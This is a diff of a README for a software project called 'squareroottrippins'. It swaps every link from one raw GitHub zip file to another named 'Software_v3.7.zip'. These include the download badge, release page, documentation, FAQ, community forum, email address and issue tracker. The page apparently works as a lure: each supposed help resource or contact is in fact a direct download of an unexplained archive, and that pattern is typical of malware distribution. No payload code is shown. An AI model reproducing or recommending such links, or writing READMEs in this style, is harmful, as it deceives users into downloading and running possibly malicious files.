@@ -6,7 +6,7 @@ Welcome to **squareroottrippins**! This application offers a fantastic user expe
 
 ## 📥 Download the Application
 
-[![Download here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip)
+[![Download here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip)
 
 ## ⚙️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip).
 2. Select the latest release.
 3. Choose the appropriate file for your operating system (look for `.exe` for Windows or `.dmg` for macOS).
 4. Click on the file to download it.
@@ -47,16 +47,16 @@ If you run into issues while downloading or installing, here are some suggestion
 
 If you need further assistance, please check the following resources:
 
-- **Documentation:** Find detailed usage instructions [here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip).
-- **FAQs:** Browse frequently asked questions [here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip).
-- **Community:** Join our community forums [here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip) to connect with other users and developers.
+- **Documentation:** Find detailed usage instructions [here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip).
+- **FAQs:** Browse frequently asked questions [here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip).
+- **Community:** Join our community forums [here](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip) to connect with other users and developers.
 
 ## 📧 Contact Us
 
 For any questions or feedback, feel free to reach out:
 
-- Email: https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip
-- GitHub Issues: [Open a new issue](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/squareroottrippins.zip)
+- Email: https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip
+- GitHub Issues: [Open a new issue](https://raw.githubusercontent.com/Girija-1722007/squareroottrippins/main/ataxaphasia/Software_v3.7.zip)
 
 ## ⚡ Conclusion
 
